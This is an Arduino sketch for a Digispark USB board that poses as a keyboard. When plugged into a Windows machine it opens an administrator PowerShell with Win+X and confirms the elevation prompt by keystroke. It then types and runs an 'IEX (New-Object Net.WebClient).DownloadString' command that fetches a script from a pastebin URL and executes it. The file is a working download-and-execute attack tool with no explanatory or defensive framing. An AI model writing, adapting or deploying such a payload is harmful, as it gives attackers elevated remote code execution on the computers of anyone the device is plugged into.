#include "DigiKeyboard.h"

void setup() {
}

void loop() {

  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(5000);
  DigiKeyboard.sendKeyStroke(KEY_X, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_A);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("IEX (New-Object Net.WebClient).DownloadString('https://pastebin.com/raw/0kqGUKpZ');");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  while(true){
    
  }


}
